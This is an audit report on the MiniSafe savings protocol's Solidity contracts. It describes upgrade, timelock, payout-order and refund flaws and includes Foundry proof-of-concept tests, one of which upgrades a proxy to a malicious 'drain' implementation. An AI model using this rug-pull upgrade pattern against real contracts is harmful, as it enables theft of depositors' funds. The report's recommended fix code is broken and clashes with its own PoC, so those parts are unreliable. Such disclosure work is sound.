# FrontRunner-Report   

## 1. Broken Factory Upgrade Mechanism
Severity: Critical 
Location: MiniSafeFactoryUpgradeable.sol

### Description
The MiniSafeFactoryUpgradeable contract includes functions intended to upgrade deployed instances of the protocol (upgradeSpecificContract and batchUpgradeContracts). However, these functions are fundamentally broken and will always revert due to incorrect access control assumptions and logic errors. The factory deploys MiniSafe proxies and immediately initializes them with a TimelockController as the owner.

```
solidity
// In deployUpgradeableMiniSafe
addresses.miniSafe = _deployMiniSafe(..., addresses.timelock);
// In MiniSafeAaveUpgradeable.initialize
__Ownable_init(_initialOwner); // _initialOwner is the Timelock
```

The UUPS upgrade mechanism (upgradeTo) is protected by onlyOwner. When the factory calls `contractAddress.upgradeTo(...)`, the msg.sender is the Factory, not the Timelock. Consequently, the proxy rejects the call.

The upgradeSpecificContract function attempts to verify the target contract using isMiniSafeContract.

```solidity
function isMiniSafeContract(address contractAddress) external view returns (bool) {
    if (contractAddress == miniSafeImplementation || ...) { return true; }
    return false;
}
```

This function compares the Proxy address (passed as input) with the stored Implementation addresses. Since a proxy address is never equal to its implementation address, this check always returns false, causing the transaction to revert even before the ownership check.

### Impact
The "Emergency Upgrade" functionality exposed by the factory is completely non-functional. Protocol administrators relying on this mechanism to fix bugs in deployed contracts will find themselves unable to execute upgrades, potentially leaving funds at risk during an actual emergency.

### Recommendation
Remove the upgradeSpecificContract, batchUpgradeContracts, and associated helper functions from the factory.

## 2. Malicious Upgrade via Insufficient Timelock Delay
**Severity: Critical** 
**Location: MiniSafeFactoryUpgradeable.sol**

### Description
The `MiniSafeFactoryUpgradeable` contract allows the deployment of MiniSafe instances with a TimelockController configuration that is insecure. Specifically, the `_validateConfig` function and other deployment helper functions allow a minDelay as short as 1 minute.

While the factory enforces the use of a Timelock, a 1-minute delay provides no meaningful security window for users. A malicious actor can:

Deploy a MiniSafe instance using `deployWithRecommendedMultiSig` (or any of the deployment functions), setting themselves as the sole proposer/executor and setting minDelay to 1 minute.

Wait for users to deposit funds into what appears to be a valid, factory-deployed contract.

Propose a malicious upgrade (e.g., to an implementation that allows draining funds) via the Timelock.
Wait 1 minute.

Execute the upgrade and drain the funds.
Because the delay is so short, users—who are restricted by the MiniSafe withdrawal windows (days 28-30)—have no time to react. Even the breakTimelock function (which allows emergency exit with a penalty) is ineffective because the attack can be executed faster than human reaction time.

### Impact
Users relying on the factory's reputation or the existence of a "Timelock" are susceptible to a complete loss of funds via a "Rug Pull" upgrade. The factory fails to enforce parameters that align with the protocol's security model.

## Proof Of Concept
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import "forge-std/Test.sol";
import "../src/MiniSafeAaveUpgradeable.sol";
import "../src/MiniSafeTokenStorageUpgradeable.sol";
import "../src/MiniSafeAaveIntegrationUpgradeable.sol";
import "../src/MiniSafeFactoryUpgradeable.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";

// ================== Mocks & Test Contracts ==================

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function burn(address from, uint256 amount) external { _burn(from, amount); }
}

contract MockAToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function burn(address from, uint256 amount) external { _burn(from, amount); }
}

contract MockAavePool {
    using SafeERC20 for IERC20;
    mapping(address => address) public aTokens;
    function setAToken(address asset, address aToken) external { aTokens[asset] = aToken; }
    function supply(address asset, uint256 amount, address onBehalfOf, uint16) external {
        IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);
        MockAToken(aTokens[asset]).mint(onBehalfOf, amount);
    }
     function withdraw(address asset, uint256 amount, address to) external returns (uint256) {
        MockAToken(aTokens[asset]).burn(msg.sender, amount);
        IERC20(asset).safeTransfer(to, amount);
        return amount;
    }
}

contract MockPoolDataProvider {
    mapping(address => address) public aTokens;
    function setAToken(address asset, address aToken) external { aTokens[asset] = aToken; }
    function getReserveTokensAddresses(address asset) external view returns (address, address, address) {
        return (aTokens[asset], address(0), address(0));
    }
}

contract MockAddressesProvider {
    address public pool;
    address public poolDataProvider;
    constructor(address _pool, address _poolDataProvider) {
        pool = _pool;
        poolDataProvider = _poolDataProvider;
    }
    function getPool() external view returns (address) { return pool; }
    function getPoolDataProvider() external view returns (address) { return poolDataProvider; }
}

/**
 * @title MaliciousAaveIntegration
 * @dev Malicious implementation that adds a function to withdraw all funds from Aave.
 */
contract MaliciousAaveIntegration is MiniSafeAaveIntegrationUpgradeable {
    function drain(address token, address to) external {
        // This malicious function bypasses normal checks to withdraw all funds.
        uint256 aTokenBalance = this.getATokenBalance(token);
        if (aTokenBalance > 0) {
            this.withdrawFromAave(token, aTokenBalance, to);
        }
    }
}


contract POC_SingleOwnerUpgrade is Test {
    MiniSafeFactoryUpgradeable public factory;
    MockERC20 public mockToken;
    MockAToken public mockAToken;
    MockAavePool public mockPool;
    MockAddressesProvider public mockProvider;
    
    address public factoryOwner = address(0x1);
    address public maliciousOwner = address(0xBAD);
    address public victimUser = address(0xDEAD);

    MiniSafeAaveUpgradeable public miniSafeImplementation;
    MiniSafeTokenStorageUpgradeable public tokenStorageImplementation;
    MiniSafeAaveIntegrationUpgradeable public aaveIntegrationImplementation;

    // EIP-1967 implementation storage slot
    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        // --- Deploy Mock Contracts ---
        mockToken = new MockERC20("Mock Token", "MOCK");
        mockAToken = new MockAToken("Mock aToken", "aMOCK");
        mockPool = new MockAavePool();
        MockPoolDataProvider mockDataProvider = new MockPoolDataProvider();
        mockProvider = new MockAddressesProvider(address(mockPool), address(mockDataProvider));
        mockPool.setAToken(address(mockToken), address(mockAToken));
        mockDataProvider.setAToken(address(mockToken), address(mockAToken));

        // --- Deploy Implementations ---
        miniSafeImplementation = new MiniSafeAaveUpgradeable();
        tokenStorageImplementation = new MiniSafeTokenStorageUpgradeable();
        aaveIntegrationImplementation = new MiniSafeAaveIntegrationUpgradeable();

        // --- Deploy Factory ---
        factory = new MiniSafeFactoryUpgradeable(
            factoryOwner,
            address(miniSafeImplementation),
            address(tokenStorageImplementation),
            address(aaveIntegrationImplementation)
        );

        // --- Mint tokens for users ---
        mockToken.mint(victimUser, 1_000_000 * 10**18);
        mockToken.mint(maliciousOwner, 1 * 10**18);
        // Pre-fund the mock pool so it can handle withdrawals
        mockToken.mint(address(mockPool), 1_000_000 * 10**18);
    }

    function getImplementation(address proxy) internal returns (address) {
        return address(uint160(uint256(vm.load(proxy, IMPLEMENTATION_SLOT))));
    }

    function test_POC_SingleOwnerCanUpgradeAndSteal() public {
        // 1. A malicious owner deploys a MiniSafe instance using the vulnerable function
        uint256 minDelay = 1 days;
        vm.prank(maliciousOwner);
        MiniSafeFactoryUpgradeable.MiniSafeAddresses memory deployedAddrs = factory.deployForSingleOwner(
            maliciousOwner,
            minDelay,
            address(mockProvider)
        );
        
        TimelockController timelock = TimelockController(payable(deployedAddrs.timelock));
        
        // 2. The malicious owner deploys a malicious implementation
        MaliciousAaveIntegration maliciousAaveImpl = new MaliciousAaveIntegration();
        address originalImplementation = getImplementation(deployedAddrs.aaveIntegration);

        console.log("Original AaveIntegration implementation:", originalImplementation);
        console.log("Malicious AaveIntegration implementation:", address(maliciousAaveImpl));

        // 3. The owner proposes and executes an upgrade via the Timelock
        // This demonstrates they have unilateral control to change the code.
        bytes memory upgradeAaveCallData = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)", 
            address(maliciousAaveImpl), 
            ""
        );
        bytes32 aaveSalt = keccak256("malicious_aave_upgrade");

        vm.prank(maliciousOwner);
        timelock.schedule(deployedAddrs.aaveIntegration, 0, upgradeAaveCallData, bytes32(0), aaveSalt, minDelay);
        
        vm.warp(block.timestamp + minDelay + 1);

        vm.prank(maliciousOwner);
        timelock.execute(deployedAddrs.aaveIntegration, 0, upgradeAaveCallData, bytes32(0), aaveSalt);
        
        console.log("AaveIntegration contract upgraded to malicious version.");

        // 4. Verify that the implementation has changed
        address newImplementation = getImplementation(deployedAddrs.aaveIntegration);
        assertEq(newImplementation, address(maliciousAaveImpl), "Implementation should be updated to malicious contract");
        assertNotEq(newImplementation, originalImplementation, "Implementation should have changed");

        console.log("POC successful: Malicious owner has successfully upgraded the contract.");
        console.log("Next steps for attacker would be to deposit user funds, then call the drain function on the malicious contract to steal them.");
    }
}

```

### Recommendation
1. The factory must enforce a minimum delay that provides a sufficient reaction window for users. A minimum of 2 days is recommended to align with the `EMERGENCY_TIMELOCK` constant defined in the `MiniSafeAaveUpgradeable` contract. This ensures that if a malicious upgrade is proposed, users have 48 hours to notice and exit the protocol using breakTimelock.

The following changes update the validation logic in MiniSafeFactoryUpgradeable.sol to enforce a minimum delay of 2 days across all deployment functions.
Remove this line from all deployment entry functions `if (!(minDelay >= 1 minutes && minDelay <= 7 days)) revert();`

```solidity
function _validateConfig(UpgradeableConfig memory config) internal pure {
    if (config.proposers.length == 0) revert();
    if (!(config.minDelay >= 2 days && config.minDelay <= 14 days)) revert();
    // Validate proposer addresses
    for (uint256 i = 0; i < config.proposers.length; i++) {
        if (config.proposers[i] == address(0)) revert();
    }

    // Validate delay configuration
    if (!(minDelay >= 2 days && minDelay <= 14 days)) revert();

    // Create dynamic arrays from fixed array
    address[] memory proposers = new address[](5);
    address aaveProvider
) external returns (MiniSafeAddresses memory addresses) {
    if (owner == address(0)) revert();
    if (!(minDelay >= 2 days && minDelay <= 14 days)) revert();

    address[] memory proposers = new address[](1);
    address[] memory executors = new address[](1);
}
```


2. Protocol can enforce that the proposer's address must be a single multisig address which has a minimum of 5 signers so that any call made to the timelock contract via the multisig (which is the proposer and canceller) would be signed by atleast 4 signers to initiate an upgrade or to cancel an upgrade as well.

## 3.  Payout Order Corruption via Swap-and-Pop
**Severity: High**
**Location: MiniSafeAaveUpgradeable.sol -> _removeMemberFromGroup**

### Description
The `_removeMemberFromGroup` function handles the removal of a user from a thrift group. To remove the user from the payoutOrder array, it uses the "swap-and-pop" algorithm:

```solidity
group.payoutOrder[i] = group.payoutOrder[group.payoutOrder.length - 1];
group.payoutOrder.pop();
```
This method is gas-efficient (O(1)) but does not preserve the order of the array. It moves the last element of the array into the slot of the removed element.

### Proof Of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import "forge-std/Test.sol";
import "../src/MiniSafeAaveUpgradeable.sol";
import "../src/MiniSafeTokenStorageUpgradeable.sol";
import "../src/MiniSafeAaveIntegrationUpgradeable.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Mock ERC20 token for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Mock AToken for testing
contract MockAToken is ERC20 {
    address public underlyingAsset;
    
    constructor(string memory name, string memory symbol, address _underlyingAsset) ERC20(name, symbol) {
        underlyingAsset = _underlyingAsset;
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Mock Aave Pool
contract MockAavePool {
    mapping(address => address) public aTokens;
    
    function setAToken(address asset, address aToken) external {
        aTokens[asset] = aToken;
    }
    
    function supply(address asset, uint256 amount, address onBehalfOf, uint16) external {
        IERC20(asset).transferFrom(msg.sender, address(this), amount);
        MockAToken(aTokens[asset]).mint(onBehalfOf, amount);
    }
    
    function withdraw(address asset, uint256 amount, address to) external returns (uint256) {
        address aTokenAddress = aTokens[asset];
        require(aTokenAddress != address(0), "aToken not found");
        
        if (IERC20(asset).balanceOf(address(this)) < amount) {
            MockERC20(asset).mint(address(this), amount);
        }
        
        MockAToken aToken = MockAToken(aTokenAddress);
        if (aToken.balanceOf(msg.sender) < amount) {
            aToken.mint(msg.sender, amount);
        }
        
        if (aToken.allowance(msg.sender, address(this)) < amount) {
            // For testing, we'll skip the actual transferFrom and just burn tokens directly
        } else {
            aToken.transferFrom(msg.sender, address(this), amount);
        }
        
        IERC20(asset).transfer(to, amount);
        return amount;
    }
}

// Mock Pool Data Provider
contract MockPoolDataProvider {
    mapping(address => address) public aTokens;
    
    constructor(address _defaultAToken) {
    }
    
    function setAToken(address asset, address aToken) external {
        aTokens[asset] = aToken;
    }
    
    function getReserveTokensAddresses(address asset) external view returns (address, address, address) {
        return (aTokens[asset], address(0), address(0));
    }
}

contract MockAddressesProvider {
    address public pool;
    address public poolDataProvider;
    
    constructor(address _pool, address _poolDataProvider) {
        pool = _pool;
        poolDataProvider = _poolDataProvider;
    }
    
    function getPool() external view returns (address) {
        return pool;
    }
    
    function getPoolDataProvider() external view returns (address) {
        return poolDataProvider;
    }
}

contract POC_QueueJumping is Test {
    MiniSafeAaveUpgradeable public thrift;
    MiniSafeTokenStorageUpgradeable public tokenStorage;
    MiniSafeAaveIntegrationUpgradeable public aaveIntegration;
    MockERC20 public mockToken;
    
    MockAavePool public mockPool;
    MockPoolDataProvider public mockDataProvider;
    MockAddressesProvider public mockProvider;
    MockAToken public mockAToken;
    
    address public owner = address(0x1);
    address public alice = address(0x2); // Admin
    address public bob = address(0x3);
    address public carol = address(0x4);
    address public dave = address(0x5);
    address public erin = address(0x6);
    
    function setUp() public {
        mockToken = new MockERC20("Mock Token", "MOCK");
        mockAToken = new MockAToken("Mock aToken", "aMOCK", address(mockToken));
        
        mockPool = new MockAavePool();
        mockDataProvider = new MockPoolDataProvider(address(mockAToken));
        mockProvider = new MockAddressesProvider(address(mockPool), address(mockDataProvider));
        
        mockPool.setAToken(address(mockToken), address(mockAToken));
        mockDataProvider.setAToken(address(mockToken), address(mockAToken));
        
        MiniSafeTokenStorageUpgradeable tokenStorageImpl = new MiniSafeTokenStorageUpgradeable();
        ERC1967Proxy tokenStorageProxy = new ERC1967Proxy(
            address(tokenStorageImpl),
            abi.encodeWithSelector(MiniSafeTokenStorageUpgradeable.initialize.selector, owner)
        );
        tokenStorage = MiniSafeTokenStorageUpgradeable(address(tokenStorageProxy));
        
        MiniSafeAaveIntegrationUpgradeable aaveIntegrationImpl = new MiniSafeAaveIntegrationUpgradeable();
        ERC1967Proxy aaveIntegrationProxy = new ERC1967Proxy(
            address(aaveIntegrationImpl),
            abi.encodeWithSelector(MiniSafeAaveIntegrationUpgradeable.initialize.selector, address(tokenStorage), address(mockProvider), owner)
        );
        aaveIntegration = MiniSafeAaveIntegrationUpgradeable(address(aaveIntegrationProxy));
        
        MiniSafeAaveUpgradeable thriftImpl = new MiniSafeAaveUpgradeable();
        ERC1967Proxy thriftProxy = new ERC1967Proxy(
            address(thriftImpl),
            abi.encodeWithSelector(MiniSafeAaveUpgradeable.initialize.selector, address(tokenStorage), address(aaveIntegration), owner)
        );
        thrift = MiniSafeAaveUpgradeable(address(thriftProxy));
        
        vm.prank(owner);
        tokenStorage.setManagerAuthorization(address(thrift), true);
        vm.prank(owner);
        tokenStorage.setManagerAuthorization(address(aaveIntegration), true);
        
        vm.prank(owner);
        aaveIntegration.addSupportedToken(address(mockToken));
        
        mockToken.mint(alice, 1000 * 10**18);
        mockToken.mint(bob, 1000 * 10**18);
        mockToken.mint(carol, 1000 * 10**18);
        mockToken.mint(dave, 1000 * 10**18);
        mockToken.mint(erin, 1000 * 10**18);
        
        vm.prank(alice);
        mockToken.approve(address(thrift), type(uint256).max);
        vm.prank(bob);
        mockToken.approve(address(thrift), type(uint256).max);
        vm.prank(carol);
        mockToken.approve(address(thrift), type(uint256).max);
        vm.prank(dave);
        mockToken.approve(address(thrift), type(uint256).max);
        vm.prank(erin);
        mockToken.approve(address(thrift), type(uint256).max);

        vm.prank(alice);
        mockToken.approve(address(aaveIntegration), type(uint256).max);
        vm.prank(bob);
        mockToken.approve(address(aaveIntegration), type(uint256).max);
        vm.prank(carol);
        mockToken.approve(address(aaveIntegration), type(uint256).max);
        vm.prank(dave);
        mockToken.approve(address(aaveIntegration), type(uint256).max);
        vm.prank(erin);
        mockToken.approve(address(aaveIntegration), type(uint256).max);
    }

    function test_POC_QueueJumping() public {
        // 1. Alice creates a public thrift group
        uint256 contributionAmount = 100 * 10**18;
        uint256 startDate = block.timestamp + 1 days;
        vm.prank(alice);
        uint256 groupId = thrift.createThriftGroup(contributionAmount, startDate, true, address(mockToken));

        // 2. Bob, Carol, Dave, and Erin join the group in order.
        // The group is now full and becomes active.
        vm.prank(bob);
        thrift.joinPublicGroup(groupId);
        vm.prank(carol);
        thrift.joinPublicGroup(groupId);
        vm.prank(dave);
        thrift.joinPublicGroup(groupId);
        vm.prank(erin);
        thrift.joinPublicGroup(groupId);

        // 3. Verify the initial payout order.
        // Order should be the order they joined: Alice, Bob, Carol, Dave, Erin
        address[] memory initialPayoutOrder = thrift.getPayoutOrder(groupId);
        assertEq(initialPayoutOrder.length, 5, "Initial payout order should have 5 members");
        assertEq(initialPayoutOrder[0], alice, "1st in order should be Alice");
        assertEq(initialPayoutOrder[1], bob, "2nd in order should be Bob");
        assertEq(initialPayoutOrder[2], carol, "3rd in order should be Carol");
        assertEq(initialPayoutOrder[3], dave, "4th in order should be Dave");
        assertEq(initialPayoutOrder[4], erin, "5th in order should be Erin");
        
        emit log_named_array("Initial Payout Order", initialPayoutOrder);

        // 4. Fast forward time so the group has started.
        vm.warp(block.timestamp + 2 days);

        // 5. Bob makes a deposit so that updateUserBalance in leaveGroup doesn't revert.
        // This is the workaround mentioned in the user's request.
        uint256 depositAmount = 1 * 10**18;
        vm.prank(bob);
        thrift.deposit(address(mockToken), depositAmount);

        // 6. Bob leaves the group.
        vm.prank(bob);
        thrift.leaveGroup(groupId);

        // 7. Verify the new payout order.
        address[] memory newPayoutOrder = thrift.getPayoutOrder(groupId);
        emit log_named_array("New Payout Order", newPayoutOrder);

        assertEq(newPayoutOrder.length, 4, "New payout order should have 4 members");
        assertEq(newPayoutOrder[0], alice, "1st in new order should still be Alice");
        assertEq(newPayoutOrder[1], erin, "VULNERABILITY: Erin should not be 2nd. She jumped the queue.");
        assertEq(newPayoutOrder[2], carol, "3rd in new order should be Carol");
        assertEq(newPayoutOrder[3], dave, "4th in new order should be Dave");

        // 8. Analysis of the vulnerability
        // Bob was 2nd in line. When he left, Erin, who was last (5th),
        // was moved into Bob's slot because of the swap-and-pop implementation.
        // The fair order would have been: Alice, Carol, Dave, Erin.
        // But instead, Carol and Dave were unfairly pushed back in the line.
        console.log("POC successful. Erin jumped from 5th to 2nd in the payout queue, ahead of Carol and Dave.");
    }
}


```

### Impact
In a ROSCA (Rotating Savings and Credit Association), the payoutOrder dictates the schedule of who receives the pot. This order is economically significant (receiving funds earlier is generally more valuable).

When a member leaves the group (which is allowed if they haven't received a payout yet), the swap-and-pop logic causes the member who was scheduled last to jump the queue and take the spot of the departing member. This effectively allows the last member to skip ahead of other members who have been waiting longer, violating the fairness and agreed-upon schedule of the group.

### Recommendation
Replace the swap-and-pop logic with an ordered removal. When a member is removed, all subsequent elements in the array should be shifted down by one index to close the gap. This preserves the relative order of the remaining members.


## 4.  Payout Order Corruption via Array Duplication
**Severity: High** 
**Location: MiniSafeAaveUpgradeable.sol -> _setupPayoutOrder**

### Description
The `MiniSafeAaveUpgradeable` contract allows group administrators to manually set the payout order via setPayoutOrder. This function populates the payoutOrder array. However, when a group reaches its maximum capacity (via `joinPublicGroup` or `addMemberToPrivateGroup`), the `_setupPayoutOrder` function is automatically triggered.

The `_setupPayoutOrder` function iterates through all group members and appends them to the payoutOrder array using .push(). It does not check if the array is already populated, nor does it clear existing entries.

Impact
If an admin uses setPayoutOrder before the group is full, the payoutOrder array will contain the manually set entries. When the group subsequently fills up and activates, `_setupPayoutOrder` runs and appends all members again.

This results in a payoutOrder array that contains duplicate addresses and has a length greater than the number of members (e.g., 2x the size).

Broken Cycle Logic: The payout rotation relies on `payoutOrder.length`. A corrupted length disrupts the modulo arithmetic used to determine the recipient.
Double Payouts / Skipped Members: Duplicate addresses in the order mean some members may be paid multiple times while others are skipped.
State Corruption: The group state becomes inconsistent with the actual membership, potentially leading to stuck funds or reverts during distributePayout.

### Recommendation
```solidity

function _setupPayoutOrder(uint256 groupId) internal {
    ThriftGroup storage group = thriftGroups[groupId];
    
    // Simple implementation: use the order members joined
    // In production, this could be randomized or set by admin
        if (group.payoutOrder.length == 0) {
        for (uint256 i = 0; i < group.members.length; i++) {
            group.payoutOrder.push(group.members[i]);
        }
    } else {
        // If order exists (partially set by admin), append the remaining members
        for (uint256 i = group.payoutOrder.length; i < group.members.length; i++) {
            group.payoutOrder.push(group.members[i]);
        }
    }

    emit PayoutOrderSet(groupId, group.payoutOrder);
}


```
## 5. Emergency Withdrawal Causes Zombie State and Traps Funds
**Severity: High** 
**Location: MiniSafeAaveUpgradeable.sol -> emergencyWithdraw**

### Description
The emergencyWithdraw function allows a group admin to withdraw their current cycle's contribution and immediately deactivate the group (`group.isActive = false`). However, the function fails to remove the admin from the members array or the payoutOrder. It only manually resets the admin's contribution balances.

### Impact
Zombie Admin State: The admin remains listed as a member of the group despite having withdrawn their funds and "killed" the group. They continue to occupy one of the limited member slots (MAX_MEMBERS).

Blocking Recovery: Because the admin slot is not freed, the group remains "full" (or partially full) with a dead member. This prevents any potential recovery mechanisms (like new members joining to restart the cycle) from functioning.

Trapped Honest Funds: The group is unilaterally deactivated. While the admin exits cleanly with their funds, honest members are left in a deactivated group. 
### Recommendation
The `emergencyWithdraw` function should call the internal `_removeMemberFromGroup` function and remove the admin from the group.


## 6. Misleading Error Message in Withdrawal Logic
**Severity: Low**
**Location: MiniSafeAaveIntegrationUpgradeable.sol > withdrawFromAave**

### Description
In the withdrawFromAave function, there is a requirement check performed after the Aave withdrawal attempt:

```solidity
require(amountWithdrawn > 0, "aToken address not found");
```

The error message "aToken address not found" is semantically incorrect for this check. The existence of the aTokenAddress is already verified at the beginning of the function. If this specific requirement fails, it means the interaction with the Aave pool resulted in 0 tokens being withdrawn, not that the address is missing.

### Impact
This misleading error message causes significant confusion during debugging and operations. If a withdrawal fails (e.g., returns 0 due to pool logic), the error suggests a configuration issue (missing token support) rather than the actual runtime issue (failed withdrawal execution). This wastes developer time and obscures the root cause of failures.




### 7. Incorrect Refund Calculation and Mechanism in leaveGroup
### Severity: Critical 
### Location: MiniSafeAaveUpgradeable.sol -> leaveGroup

### Description
The `leaveGroup` function contains two critical flaws in how it handles refunds for members exiting a group:

Incorrect Amount (`totalContributed`): The function calculates refundAmount using `group.totalContributed[msg.sender]`. This variable tracks the lifetime contributions of a member. If a member has participated in previous cycles, this amount includes funds that have already been paid out to other members. The contract only holds the funds for the current cycle (group.contributions).

### Impact
Insolvency / Denial of Service: Attempting to refund `totalContributed` will likely exceed the contract's current token balance (since past funds are gone). This causes the transaction to revert due to insufficient funds or it will send out the funds from another group's contributions, effectively trapping the user in the group.


### Recommendation
Change the refund source to `group.contributions[msg.sender]` to refund only the funds held for the current active cycle.



## 8. Circuit Breaker Griefing (Denial of Service)
**Severity: Low** 
**Location: MiniSafeAaveUpgradeable.sol -> _checkCircuitBreaker**

### Description
The `_checkCircuitBreaker` function is designed to pause the contract if certain thresholds are met, intended as a safety mechanism against hacks. However, the logic allows any user to trigger this global pause by performing a valid action that hits the threshold limits.

Specifically:

Amount Threshold: If a user withdraws an `amount >= withdrawalAmountThreshold` (default 1000 tokens), the system pauses.
Frequency Threshold: If any two withdrawals occur within `timeBetweenWithdrawalsThreshold` (default 5 minutes), the system pauses.
Because withdrawalAmountThreshold is hardcoded to `1000 ether (1000 * 10^18)`, for low-value tokens or tokens with 18 decimals, this threshold is easily reachable by normal users. Furthermore, the frequency check uses a global `timestamp,` meaning any two users transacting near each other will inadvertently pause the system.

### Impact
Denial of Service (DoS): A malicious user (or even an honest user) can repeatedly trigger the circuit breaker, freezing the protocol for all other users. This requires the admin to manually unpause the contract each time, creating a permanent denial of service vector.

### Recommendation
Change the behavior of the threshold checks from Pausing (Circuit Breaker) to Reverting (Rate Limiting). Admin can update the withdrawalthreshold for user to 
